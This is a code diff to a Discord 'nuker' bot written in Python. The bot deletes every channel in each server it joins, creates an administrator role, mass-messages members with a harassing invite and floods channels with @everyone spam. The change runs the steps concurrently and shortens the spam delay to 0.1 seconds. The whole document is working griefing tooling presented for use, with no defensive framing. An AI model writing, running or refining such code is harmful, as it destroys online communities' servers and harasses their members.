@@ -62,23 +62,40 @@ def nuker():
     async def on_ready():
         print(f'Logged in as {bot.user}')
         for guild in bot.guilds:
-            for member in guild.members:
-                if not member.bot:
-                    try:
-                        await member.send("Hi! Sorry for harrasing You, But the server has been reclaimed by the goat, https://discord.gg/VMkY94U8rv The bot's code is open source.")
-                        print(f'Sent DM to: {member.name}')
-                    except Exception as e:
-                        print(f'Could not send DM to: {member.name}, {e}')
             await manage_guild(guild)
 
     async def manage_guild(guild):
+        try:
+            admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
+            print(f'Created new role: {admin_role.name}')
+        except Exception as e:
+            print(f'Could not create new role: {e}')
+
+        await asyncio.gather(
+            send_messages(guild),
+            delete_channels(guild)
+        )
+
+    async def send_messages(guild):
+        def delay(seconds):
+            return asyncio.sleep(seconds)
+
+        for member in guild.members:
+            if not member.bot:
+                try:
+                    await member.send("Hi! Sorry for harassing you, but the server has been reclaimed by the goat, https://discord.gg/VMkY94U8rv The bot's code is open source.")
+                    print(f'Sent DM to: {member.name}')
+                    await delay(0.1)
+                except Exception as e:
+                    print(f'Could not send DM to: {member.name}, {e}')
+
+    async def delete_channels(guild):
         for channel in guild.channels:
             try:
                 await channel.delete()
                 print(f'Deleted channel: {channel.name}')
             except Exception as e:
                 print(f'Could not delete channel: {channel.name}, {e}')
-            
 
         for _ in range(100):
             try:
@@ -88,38 +105,11 @@ def nuker():
             except Exception as e:
                 print(f'Could not create new channel: {e}')
 
-        for role in guild.roles:
-            if role != guild.default_role:
-                try:
-                    await role.delete()
-                    print(f'Deleted role: {role.name}')
-                except Exception as e:
-                    print(f'Could not delete role: {role.name}, {e}')
-
-        try:
-            new_role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
-            print(f'Created new role: {new_role.name}')
-        except Exception as e:
-            print(f'Could not create new role: {e}')
-        try:
-            await guild.edit(name="Nuked By AlmaGangGriefs")
-            print(f'Renamed guild to "Nuked By AlmaGangGriefs"')
-        except Exception as e:
-            print(f'Could not rename guild: {e}')
-
-        for member in guild.members:
-            if not member.bot:
-                try:
-                    await member.send("Hi! Sorry for harrasing You, But the server has been reclaimed by the goat, https://discord.gg/VMkY94U8rv The bot's code is open source.")
-                    print(f'Sent DM to: {member.name}')
-                except Exception as e:
-                    print(f'Could not send DM to: {member.name}, {e}')
-
     async def spam_messages(channel):
         while True:
             try:
                 await channel.send("Nuked by AlmaGangGriefs https://discord.gg/VMkY94U8rv @everyone")
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.1)
             except Exception as e:
                 print(f'Could not send message: {e}')
                 break
